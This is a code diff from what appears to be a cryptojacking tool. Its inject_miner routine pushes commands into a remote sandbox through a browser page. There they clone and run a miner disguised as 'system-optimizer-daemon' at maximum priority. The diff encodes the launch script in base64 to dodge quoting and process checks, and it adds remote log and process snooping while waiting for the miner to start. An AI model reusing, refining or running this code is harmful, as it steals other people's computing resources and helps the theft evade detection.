@@ -24,31 +24,26 @@ def generate_random_folder_name() -> str:
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command.
 
-    No --bridge (daemon DEFAULT_BRIDGE points at the enhanced Railway service).
-    - If sysoptd already running → skip
-    - If /tmp/moly missing → clone + start (exact user cmd shape)
-    - If /tmp/moly present but python dead → restart from existing tree
-
-    Must not contain single quotes — inject wraps the cmd in sh -c '...'.
+    No --bridge. Encodes a start script as base64 so:
+    1) outer `sh -c '...'` has no single quotes / no sysoptd self-match on pgrep
+    2) pgrep inside the script file does not see the injector cmdline
     """
-    run = (
-        f"cd /tmp/{folder_name} && "
-        f"nice -n -20 python3 sysoptd.py --threads {threads} "
-        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
-    )
-    clone = (
-        f"cd /tmp && "
-        f"git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} && "
-        f"cd {folder_name} && pip install websockets psutil --break-system-packages -q && "
-        f"nice -n -20 python3 sysoptd.py --threads {threads} "
-        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
-    )
+    import base64
+    script = f"""#!/bin/sh
+if pgrep -f '[p]ython3.*sysoptd.py' >/dev/null 2>&1; then
+  echo skip-running
+  exit 0
+fi
+if [ ! -d /tmp/{folder_name} ]; then
+  cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git {folder_name} || exit 1
+  cd {folder_name} && pip install websockets psutil --break-system-packages -q || exit 1
+fi
+cd /tmp/{folder_name} && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1
+"""
+    b64 = base64.b64encode(script.encode()).decode()
+    # no single quotes in this outer string
     return (
-        f"if pgrep -f [p]ython3.*sysoptd >/dev/null 2>&1; then "
-        f"echo skip-running; "
-        f"elif [ ! -d /tmp/{folder_name} ]; then "
-        f"{clone}; "
-        f"else {run}; fi"
+        f"echo {b64} | base64 -d > /tmp/run_moly.sh && chmod +x /tmp/run_moly.sh && /tmp/run_moly.sh"
     )
 
 
@@ -184,13 +179,27 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
             return False
 
         # Clone+pip can take a bit — confirm sysoptd before claiming success
-        for wait_s in (8, 12, 20):
+        for wait_s in (15, 25, 40, 60):
             await asyncio.sleep(wait_s)
             alive, raw = await probe_worker(page)
             if alive:
                 print(f"✅ Worker command sent! Folder: {folder_name} (sysoptd={raw})")
                 return True
-            print(f"   ⏳ waiting for sysoptd… ({raw})")
+            try:
+                diag = await asyncio.wait_for(
+                    shell_exec(
+                        page,
+                        "tail -n 30 /tmp/inject.log 2>/dev/null; echo ==M==; "
+                        "tail -n 15 /tmp/m.log 2>/dev/null; echo ==LS==; "
+                        "ls -la /tmp/moly 2>/dev/null | head -8; echo ==PS==; "
+                        "ps -A -o args 2>/dev/null | head -20",
+                    ),
+                    timeout=45,
+                )
+                print(f"   ⏳ waiting for sysoptd… ({raw})")
+                print(f"   📋 diag: {(diag.get('stdout') or diag.get('stderr') or '')[:500]}")
+            except Exception as e:
+                print(f"   ⏳ waiting for sysoptd… ({raw}) diag-err={e}")
         print("❌ Worker never appeared in sandbox after inject")
         return False
 
